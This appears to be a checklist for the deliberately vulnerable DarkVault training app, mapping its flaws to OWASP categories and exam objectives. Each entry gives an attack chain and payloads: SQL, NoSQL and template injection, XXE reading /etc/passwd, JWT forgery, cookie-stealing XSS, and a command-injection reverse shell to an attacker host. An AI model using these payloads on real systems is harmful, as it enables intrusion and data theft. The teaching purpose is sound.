# DarkVault Vulnerability Checklist

This checklist maps all DarkVault vulnerabilities to exam topics and OWASP Top 10 categories, including detailed attack chains and exploitation methods.

## OWASP Top 10 Coverage

### A01: Broken Access Control
- [x] **IDOR vulnerabilities in user profiles**
  - **Path**: `/user/:id`
  - **Attack Chain**: 
    1. Login with any account
    2. Navigate to your profile (e.g., `/user/2`)
    3. Change the ID in URL to another user's ID (e.g., `/user/1` for admin)
    4. Access unauthorized profile data
  - **Payload**: Direct URL manipulation

- [x] **Horizontal privilege escalation**
  - **Path**: `/api/users/:id`, `/user/:id/todos`
  - **Attack Chain**:
    1. Login as a regular user
    2. Access your own data to observe pattern
    3. Change ID parameter to access another user's data
    4. Extract sensitive information from other users
  - **Payload**: Direct resource identifier manipulation

- [x] **Vertical privilege escalation**
  - **Path**: `/api/auth` (JWT manipulation)
  - **Attack Chain**:
    1. Login as a regular user
    2. Extract JWT token from request
    3. Decode JWT using [jwt.io](https://jwt.io)
    4. Change `isAdmin` to `true` and `role` to `admin`
    5. Use modified token in requests to gain admin privileges
  - **Payload**: Modified JWT token

- [x] **Missing access controls on admin panel**
  - **Path**: `/admin`
  - **Attack Chain**:
    1. Login as a regular user
    2. Directly browse to `/admin` URL
    3. Access administrative functions without proper authorization
  - **Payload**: Direct URL access

- [x] **Broken object level authorization**
  - **Path**: `/api/users/:id`, `/api/graphql`
  - **Attack Chain**:
    1. Authenticate to the API
    2. Request your own user object to understand structure
    3. Change object ID to request another user's data
    4. Access unauthorized data from other users
  - **Payload**: GraphQL query with different user ID

- [x] **Path traversal vulnerabilities**
  - **Path**: `/api/file?name=../../../etc/passwd`
  - **Attack Chain**:
    1. Access file reading functionality
    2. Replace filename with directory traversal sequence
    3. Access files outside intended directory
    4. Read sensitive system files
  - **Payload**: `../../../etc/passwd`, `../../../etc/shadow`

### A02: Cryptographic Failures
- [x] **Weak password hashing (MD5)**
  - **Path**: Database access via SQL injection
  - **Attack Chain**:
    1. Perform SQL injection to dump user table
    2. Extract MD5 hashes
    3. Crack hashes using rainbow tables or brute force
    4. Gain access to user accounts
  - **Payload**: SQL injection to extract hashes

- [x] **Insecure JWT implementation**
  - **Path**: `/api/auth`
  - **Attack Chain**:
    1. Obtain JWT token
    2. Analyze token structure (weak key, no signature validation)
    3. Forge new token with elevated privileges
    4. Bypass authentication controls
  - **Payload**: JWT with modified claims
  - **Key**: "darkvault-secret-key" (hardcoded in app.js)

- [x] **Plaintext data transmission**
  - **Path**: All communication
  - **Attack Chain**:
    1. Set up network traffic capture
    2. Capture requests and responses
    3. Extract sensitive data sent in plaintext
  - **Tool**: Wireshark or Burp Suite

- [x] **Missing encryption for sensitive data**
  - **Path**: `/api/export`
  - **Attack Chain**:
    1. Request data export
    2. Analyze response to find unencrypted sensitive data
    3. Extract plaintext credentials or personal information
  - **Payload**: Standard API request

- [x] **Hardcoded cryptographic keys**
  - **Path**: Source code (app.js, routes/api.js)
  - **Attack Chain**:
    1. Access source code via path traversal
    2. Locate hardcoded keys and secrets
    3. Use keys to decrypt data or forge tokens
  - **Keys Found**: 
    - JWT_SECRET = "darkvault-secret-key"
    - ENCRYPTION_KEY = "darkv4ult-3ncrypt10n-k3y"

- [x] **Weak random number generation**
  - **Path**: Password reset, session tokens
  - **Attack Chain**:
    1. Request multiple password resets
    2. Analyze token patterns
    3. Predict future tokens based on pattern
    4. Reset target user's password
  - **Tool**: Statistical analysis of token patterns

### A03: Injection
- [x] **SQL injection in login form**
  - **Path**: `/login`, `/user/login`
  - **Attack Chain**:
    1. Enter malicious input in login form
    2. Bypass authentication
    3. Extract database information
  - **Payloads**:
    - Authentication bypass: `' OR 1=1 --`
    - Database enumeration: `' UNION SELECT 1,2,3,4,5,6,7 FROM users--`
    - Data extraction: `' UNION SELECT NULL,NULL,username,password,NULL,NULL,NULL FROM users--`

- [x] **SQL injection in product search**
  - **Path**: `/products/search`
  - **Attack Chain**:
    1. Enter malicious input in search field
    2. Extract data from database
    3. Access unauthorized information
  - **Payloads**:
    - Basic test: `'`
    - Database version: `' UNION SELECT 1,2,sqlite_version(),4--`
    - Table enumeration: `' UNION SELECT 1,2,name,4 FROM sqlite_master WHERE type='table'--`

- [x] **Command injection in ping tool**
  - **Path**: `/ping`
  - **Attack Chain**:
    1. Access ping tool
    2. Enter malicious input with command separators
    3. Execute arbitrary OS commands
  - **Payloads**:
    - Command execution: `localhost; id`
    - File access: `localhost; cat /etc/passwd`
    - Reverse shell: `localhost; bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'`

- [x] **XPath injection in XML processor**
  - **Path**: `/api/import-xml`
  - **Attack Chain**:
    1. Identify XML processing functionality
    2. Craft malicious XML with XPath injection
    3. Extract information from XML data store
  - **Payload**: `' or '1'='1`

- [x] **NoSQL injection in document queries**
  - **Path**: `/api/search-users`
  - **Attack Chain**:
    1. Identify NoSQL-based functionality
    2. Submit JSON with special operators
    3. Bypass authentication or extract data
  - **Payloads**:
    - Authentication bypass: `{"username": {"$ne": null}, "password": {"$ne": null}}`
    - Data extraction: `{"username": {"$regex": "^adm"}}`

- [x] **SSTI (Server-Side Template Injection)**
  - **Path**: `/render-template`
  - **Attack Chain**:
    1. Identify template rendering functionality
    2. Submit template syntax as input
    3. Execute code through template engine
  - **Payloads**:
    - Basic test: `<%= 7*7 %>`
    - Environment variables: `<%= process.env %>`
    - Command execution: `<%= require('child_process').execSync('id') %>`

- [x] **GraphQL injection vulnerabilities**
  - **Path**: `/api/graphql`
  - **Attack Chain**:
    1. Discover GraphQL endpoint
    2. Send introspection query to map schema
    3. Craft queries to access unauthorized data
  - **Payloads**:
    - Introspection: `{ __schema { types { name fields { name type } } } }`
    - Field extraction: `{ user(id: "1") { id username password email } }`

### A04: Insecure Design
- [x] **Lack of rate limiting**
  - **Path**: `/api/auth`, `/login`, `/api/no-rate-limit`
  - **Attack Chain**:
    1. Identify authentication endpoints
    2. Send numerous requests in rapid succession
    3. Brute force credentials without restriction
  - **Tool**: Script to send multiple concurrent requests

- [x] **Missing security controls**
  - **Path**: Various endpoints
  - **Attack Chain**:
    1. Identify functionality without proper security controls
    2. Bypass authentication/authorization
    3. Access protected resources
  - **Example**: Direct access to admin panel

- [x] **Insecure business logic**
  - **Path**: `/api/order/discount`, `/api/coupon`
  - **Attack Chain**:
    1. Analyze business logic flow
    2. Identify logical flaws
    3. Manipulate process to achieve unintended results
  - **Example**: Apply discount multiple times by manipulating order ID

- [x] **Predictable resource location**
  - **Path**: `/users/1`, `/files/1.txt`
  - **Attack Chain**:
    1. Observe pattern in resource URLs
    2. Predict other resource locations
    3. Access resources directly
  - **Tool**: Automated enumeration script

- [x] **Race conditions in important operations**
  - **Path**: `/api/update-balance`, `/api/apply-promo`
  - **Attack Chain**:
    1. Identify balance update functionality
    2. Send multiple concurrent requests
    3. Exploit timing issue to increase balance multiple times
  - **Tool**: Script for concurrent requests

### A05: Security Misconfiguration
- [x] **Default/weak credentials**
  - **Path**: `/login`, `/admin`
  - **Attack Chain**:
    1. Identify login pages
    2. Try default credentials
    3. Gain unauthorized access
  - **Credentials**: admin/SecretPassword123!, test/test123

- [x] **Verbose error messages**
  - **Path**: Various endpoints
  - **Attack Chain**:
    1. Submit malformed input
    2. Analyze detailed error responses
    3. Extract system information and stack traces
  - **Example**: SQL error revealing database structure

- [x] **Missing security headers**
  - **Path**: All responses
  - **Attack Chain**:
    1. Examine HTTP response headers
    2. Identify missing security headers
    3. Exploit XSS, clickjacking, etc.
  - **Headers Missing**: 
    - Content-Security-Policy
    - X-Frame-Options
    - X-XSS-Protection

- [x] **Unnecessary features enabled**
  - **Path**: Server configuration
  - **Attack Chain**:
    1. Enumerate server capabilities
    2. Identify unnecessary features
    3. Exploit additional attack surface
  - **Example**: Debug mode enabled

- [x] **Outdated software components**
  - **Path**: `/package.json`
  - **Attack Chain**:
    1. Identify software versions
    2. Research known vulnerabilities
    3. Exploit outdated components
  - **Tool**: npm audit, OWASP Dependency Check

## API-Specific Vulnerabilities

### Broken Object Level Authorization
- [x] **Direct access to other users' resources via IDOR**
  - **Path**: `/api/users/:id`, `/api/todos/:id`
  - **Attack Chain**:
    1. Authenticate to obtain valid session
    2. Change resource IDs in requests
    3. Access resources belonging to other users
  - **Example**: `/api/todos/5` → `/api/todos/1`

- [x] **Missing resource ownership validation in REST endpoints**
  - **Path**: `/api/graphql`
  - **Attack Chain**:
    1. Authenticate as a regular user
    2. Send GraphQL query requesting another user's data
    3. Extract sensitive information
  - **Example Query**: 
    ```
    {
      getUserData(id: "1") {
        username
        email
        accountDetails {
          creditCard
        }
      }
    }
    ```

- [x] **API endpoints bypassing access controls**
  - **Path**: `/api/admin/users` with `?admin=true` parameter
  - **Attack Chain**:
    1. Find API endpoint with weak authorization
    2. Add query parameter to bypass check
    3. Access administrative functions
  - **Example**: `/api/admin/users?admin=true`

### Improper Rate Limiting
- [x] **Missing rate limiting on authentication endpoints**
  - **Path**: `/api/auth/login`, `/login`
  - **Attack Chain**:
    1. Create script to send multiple login attempts
    2. Brute force credentials without restriction
    3. Eventually gain unauthorized access
  - **Tool**: Password spraying script

- [x] **No throttling on sensitive operations**
  - **Path**: `/api/password-reset`, `/api/transfer`
  - **Attack Chain**:
    1. Identify sensitive functionality
    2. Send numerous requests without restriction
    3. Exploit lack of throttling for malicious purposes
  - **Example**: Multiple password reset attempts

### API-Specific Injection Points
- [x] **GraphQL query injection**
  - **Path**: `/api/graphql`
  - **Attack Chain**:
    1. Identify GraphQL endpoint
    2. Craft malicious queries
    3. Extract unauthorized data
  - **Example**: Nested queries to extract more data than intended

- [x] **JSON parameter pollution**
  - **Path**: `/api/merge-config`
  - **Attack Chain**:
    1. Identify JSON processing functionality
    2. Submit duplicate parameters with different values
    3. Cause unexpected behavior
  - **Payload**: `{"param": "value1", "param": "value2"}`

- [x] **XML External Entity (XXE) in API requests**
  - **Path**: `/api/import-xml`
  - **Attack Chain**:
    1. Identify XML processing endpoint
    2. Craft XML with external entity
    3. Read local files or perform SSRF
  - **Payload**:
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <data>&xxe;</data>
    ```

## Authentication Weaknesses

### Weak Password Recovery
- [x] **Predictable reset tokens**
  - **Path**: `/user/forgot-password`
  - **Attack Chain**:
    1. Request password reset for target account
    2. Analyze token pattern (Base64 encoded username:timestamp)
    3. Predict or forge valid tokens
    4. Reset victim's password
  - **Example**: `dXNlcjE6MTYzMTIwMDAwMA==` (Base64 of "user1:1631200000")

- [x] **Information disclosure in error messages**
  - **Path**: `/user/forgot-password`
  - **Attack Chain**:
    1. Submit various usernames for password reset
    2. Observe different error messages
    3. Enumerate valid accounts based on responses
  - **Example**: "No account found with that username" vs. "Email sent"

- [x] **No rate limiting in recovery process**
  - **Path**: `/user/forgot-password`
  - **Attack Chain**:
    1. Create script to send multiple password reset requests
    2. Attempt to brute force or predict reset tokens
    3. Reset target user's password
  - **Tool**: Automated request script

- [x] **Token leakage in URLs/logs**
  - **Path**: `/user/reset-password?token=TOKEN`
  - **Attack Chain**:
    1. Initiate password reset
    2. Observe token in URL
    3. Extract token from browser history, server logs, or referrer headers
  - **Example**: Token visible in URL parameters

### Token Handling Issues
- [x] **Token leakage in response headers**
  - **Path**: `/user/reset-password` (response)
  - **Attack Chain**:
    1. Complete password reset process
    2. Examine response headers
    3. Extract sensitive information from custom headers
  - **Example**: `X-Auth-Token` header containing user credentials

- [x] **Missing token expiration**
  - **Path**: JWT tokens from `/api/auth`
  - **Attack Chain**:
    1. Obtain JWT token
    2. Observe lack of expiration claim
    3. Use token indefinitely
  - **Tool**: JWT analyzer

- [x] **Improper token validation**
  - **Path**: JWT handling in `/api/auth`
  - **Attack Chain**:
    1. Create JWT with algorithm "none"
    2. Modify payload claims
    3. Bypass signature verification
  - **Payload**: JWT with header `{"alg":"none"}`

### Session Management
- [x] **Session fixation vulnerability**
  - **Path**: `/user/session-fixation`
  - **Attack Chain**:
    1. Set victim's session ID via URL parameter
    2. Victim logs in (session ID not regenerated)
    3. Attacker uses known session ID to access authenticated session
  - **Example**: `/user/session-fixation?sessionId=known-value`

- [x] **Missing secure/httpOnly cookie flags**
  - **Path**: Cookie examination
  - **Attack Chain**:
    1. Examine cookie attributes
    2. Identify missing security flags
    3. Exploit via XSS or MitM attacks
  - **Tool**: Browser developer tools

- [x] **No session timeout implementation**
  - **Path**: Session testing
  - **Attack Chain**:
    1. Authenticate to application
    2. Wait for extended period
    3. Verify session still active
  - **Example**: 24+ hour session validity

## Modern Web Framework Issues

### Client-Side Rendering
- [x] **DOM-based XSS in client-side scripts**
  - **Path**: `/client-render`
  - **Attack Chain**:
    1. Input malicious payload in message field
    2. JavaScript directly inserts input into innerHTML
    3. Execute arbitrary JavaScript in victim's browser
  - **Payload**: `<img src=x onerror="alert(document.cookie)">`

- [x] **Client-side template injection**
  - **Path**: `/client-render`
  - **Attack Chain**:
    1. Input template syntax in template field
    2. Unsafely evaluated by client-side template engine
    3. Execute JavaScript in victim's browser
  - **Payload**: `${alert(document.domain)}`

- [x] **URL fragment manipulation**
  - **Path**: Client-side routing
  - **Attack Chain**:
    1. Modify URL fragment (#section)
    2. Trigger vulnerable client-side routing logic
    3. Execute malicious code
  - **Example**: `/#/user/<script>alert(1)</script>`

### Template Vulnerabilities
- [x] **Template injection in EJS**
  - **Path**: `/render-template`
  - **Attack Chain**:
    1. Submit EJS template syntax
    2. Server renders template unsafely
    3. Execute server-side code
  - **Payload**: `<%= process.mainModule.require('child_process').execSync('id') %>`

- [x] **Server-side template vulnerabilities**
  - **Path**: `/api/email-template`
  - **Attack Chain**:
    1. Submit template code in customizable sections
    2. Template engine renders without proper sandbox
    3. Achieve remote code execution
  - **Payload**: Template-specific syntax for code execution

### Insecure Deserialization
- [x] **JSON deserialization vulnerabilities**
  - **Path**: `/api/import-data`
  - **Attack Chain**:
    1. Craft malicious JSON data
    2. Exploit unsafe deserialization
    3. Execute arbitrary code
  - **Tool**: Automated payload generator

- [x] **XML deserialization issues**
  - **Path**: `/api/import-xml`
  - **Attack Chain**:
    1. Create XML with malicious object
    2. Submit to endpoint with unsafe XML deserialization
    3. Trigger vulnerability during parsing
  - **Reference**: OWASP XML deserialization patterns

- [x] **Prototype pollution in JavaScript**
  - **Path**: `/api/merge-config`
  - **Attack Chain**:
    1. Create object with `__proto__` property
    2. Submit to function using unsafe recursion
    3. Modify Object prototype to affect all objects
  - **Payload**: `{"__proto__": {"isAdmin": true}}`

## Exam Topics Mapping

| Learning Objective | Vulnerabilities Implemented | Attack Vectors |
|-------------------|----------------------------|---------------|
| LO2.4 - Web application components | Express.js, EJS, SQLite, JWT, XML parsing | Component-specific attacks |
| LO3.1/LO3.2 - Enumeration | Directory structure exposure, Information disclosure | Directory bruteforce, Source analysis |
| LO4.1-LO4.3 - Reconnaissance | Information leakage, Error messages, Comments | Information gathering techniques |
| LO4.4-LO4.5 - Authentication & Authorization | SQL injection, JWT flaws, IDOR, Password recovery | Authentication bypass, Privilege escalation |
| LO4.6 - Input Validation | XSS, Command injection, SQL injection, XXE | Malicious input handling |
| LO4.7 - Information Disclosure | Path disclosure, Source exposure, Data leakage | Sensitive data exposure |
| LO4.8 - Cross-Site Scripting | Stored XSS, Reflected XSS, DOM XSS, Blind XSS | Browser-based attacks |
| LO4.9 - Injection | SQL, Command, SSTI, XXE injection types | Code/command execution |
| LO4.10 - Session Handling | Insecure configuration, Session fixation | Session attacks |
| LO4.11 - Encryption | Weak hashing, JWT issues, Missing encryption | Cryptographic weaknesses |
| LO4.12 - Source Code Review | Exposed code, Hardcoded credentials | Code analysis techniques |
| LO4.13 - Parameter Manipulation | Query tampering, Cookie manipulation | Parameter tampering |
| LO4.14 - Logging and Monitoring | Insufficient logging, Log injection | Audit/logging weaknesses |
| LO4.15 - Web API Attacks | Broken auth, No rate limiting, GraphQL issues | API-specific attacks |
| LO5.16 - Database Technologies | SQL injection, NoSQL injection | Database-specific attacks |
| LO5.17 - Third Party Libraries | Vulnerable dependencies, Template injection | Supply chain vulnerabilities |
| LO5.18 - Race Conditions | Balance updates, File operations, TOCTOU | Timing-based attacks |
| LO5.1-LO5.3 - Privilege Escalation | Vertical/Horizontal escalation methods | Gaining elevated access |
| LO6.1 - Site Component Topology | Component interconnections, Attack surface | Architectural weaknesses | 